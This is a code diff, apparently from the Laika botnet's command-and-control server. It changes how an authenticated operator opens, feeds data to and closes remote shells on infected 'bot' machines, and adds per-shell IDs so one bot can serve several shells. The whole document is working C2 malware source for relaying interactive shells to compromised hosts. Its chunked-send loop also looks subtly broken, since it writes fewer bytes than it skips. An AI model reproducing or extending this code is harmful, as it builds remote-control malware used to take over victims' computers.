@@ -1,6 +1,8 @@
 #include "lerror.h"
 #include "lmem.h"
+
 #include "cnc.h"
+#include "cpeer.h"
 #include "cpanel.h"
 
 bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData) {
@@ -39,22 +41,20 @@ void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) 
     laikaS_endOutPacket(authPeer);
 }
 
-void laikaC_closeAuthShell(struct sLaika_authInfo *aInfo) {
-    /* forward to SHELL_CLOSE to auth */
-    laikaS_emptyOutPacket(aInfo->shellBot, LAIKAPKT_SHELL_CLOSE);
+void laikaC_closeAuthShell(struct sLaika_peer *auth) {
+    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)auth->uData;
 
-    /* close shell */
-    ((struct sLaika_botInfo*)(aInfo->shellBot->uData))->shellAuth = NULL;
+    if (!aInfo->shellBot)
+        return;
+
+    /* forward SHELL_CLOSE to bot */
+    laikaS_startOutPacket(aInfo->shellBot, LAIKAPKT_SHELL_CLOSE);
+    laikaS_writeInt(&aInfo->shellBot->sock, &aInfo->shellID, sizeof(uint32_t));
+    laikaS_endOutPacket(aInfo->shellBot);
+
+    /* rmv shell */
+    laikaC_rmvShell((struct sLaika_botInfo*)aInfo->shellBot->uData, auth);
     aInfo->shellBot = NULL;
-}
-
-void laikaC_closeBotShell(struct sLaika_botInfo *bInfo) {
-    /* forward to SHELL_CLOSE to auth */
-    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_SHELL_CLOSE);
-
-    /* close shell */
-    ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
-    bInfo->shellAuth = NULL;
 }
 
 /* ============================================[[ Packet Handlers ]]============================================= */
@@ -62,9 +62,11 @@ void laikaC_closeBotShell(struct sLaika_botInfo *bInfo) {
 void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
     struct sLaika_cnc *cnc = pInfo->cnc;
-    authPeer->type = laikaS_readByte(&authPeer->sock);
+    PEERTYPE type;
+    int i;
 
-    switch (authPeer->type) {
+    type = laikaS_readByte(&authPeer->sock);
+    switch (type) {
         case PEER_AUTH:
             /* check that peer's pubkey is authenticated */
             if (!laikaK_checkAuth(authPeer->peerPub, cnc->authKeys, cnc->authKeysCount))
@@ -107,10 +109,11 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
 
     /* link shells */
     aInfo->shellBot = peer;
-    ((struct sLaika_botInfo*)(peer->uData))->shellAuth = authPeer;
+    aInfo->shellID = laikaC_addShell((struct sLaika_botInfo*)peer->uData, authPeer);
 
     /* forward the request to open a shell */
     laikaS_startOutPacket(peer, LAIKAPKT_SHELL_OPEN);
+    laikaS_writeInt(&peer->sock, &aInfo->shellID, sizeof(uint32_t));
     laikaS_writeInt(&peer->sock, &cols, sizeof(uint16_t));
     laikaS_writeInt(&peer->sock, &rows, sizeof(uint16_t));
     laikaS_endOutPacket(peer);
@@ -124,9 +127,15 @@ void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT
     if (aInfo->shellBot == NULL)
         return;
 
-    
-    laikaC_closeAuthShell(aInfo);
+    laikaC_closeAuthShell(authPeer);
 }
+
+/* improves readability */
+#define SENDSHELLDATA(peer, data, size, id) \
+    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA); \
+    laikaS_writeInt(&peer->sock, id, sizeof(uint32_t)); \
+    laikaS_write(&peer->sock, data, size); \
+    laikaS_endVarPacket(peer);
 
 void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
     uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
@@ -144,14 +153,24 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
     /* read data */
     laikaS_read(&authPeer->sock, data, sz);
 
+    /* forward data to peer */
     if (authPeer->osType == peer->osType) {
-        /* forward raw data to peer */
-        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-        laikaS_write(&peer->sock, data, sz);
-        laikaS_endVarPacket(peer);
+        if (sz + sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH) {
+            /* we need to split the buffer since the packet for c2c->bot includes an id (since a bot can host multiple shells, 
+                while the auth/shell client only keeps track of 1)
+            */
+
+            /* first part */
+            SENDSHELLDATA(peer, data, sz-sizeof(uint32_t), &aInfo->shellID);
+
+            /* second part */
+            SENDSHELLDATA(peer, data + (sz-sizeof(uint32_t)), sizeof(uint32_t), &aInfo->shellID);
+        } else {
+            SENDSHELLDATA(peer, data, sz, &aInfo->shellID);
+        }
     } else if (authPeer->osType == OS_LIN && peer->osType == OS_WIN) { /* convert data if its linux -> windows */
-        uint8_t *buf = NULL;
-        int i, count = 0, cap = 2;
+        uint8_t *buf = laikaM_malloc(sz);
+        int i, count = 0, cap = sz;
 
         /* convert line endings */
         for (i = 0; i < sz; i++) {
@@ -170,19 +189,15 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
         /* send buffer (99% of the time this isn't necessary, but the 1% can make
             buffers > LAIKA_SHELL_DATA_MAX_LENGTH. so we send it in chunks) */
         i = count;
-        while (i > LAIKA_SHELL_DATA_MAX_LENGTH) {
-            laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-            laikaS_write(&peer->sock, buf + (count - i), LAIKA_SHELL_DATA_MAX_LENGTH);
-            laikaS_endVarPacket(peer);
-            
+        while (i+sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH) {
+            SENDSHELLDATA(peer, buf + (count - i), LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t), &aInfo->shellID);            
             i -= LAIKA_SHELL_DATA_MAX_LENGTH;
         }
 
         /* send the leftovers */
-        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-        laikaS_write(&peer->sock, buf + (count - i), i);
-        laikaS_endVarPacket(peer);
-
+        SENDSHELLDATA(peer, buf + (count - i), i, &aInfo->shellID);
         laikaM_free(buf);
     }
 }
+
+#undef SENDSHELLDATA
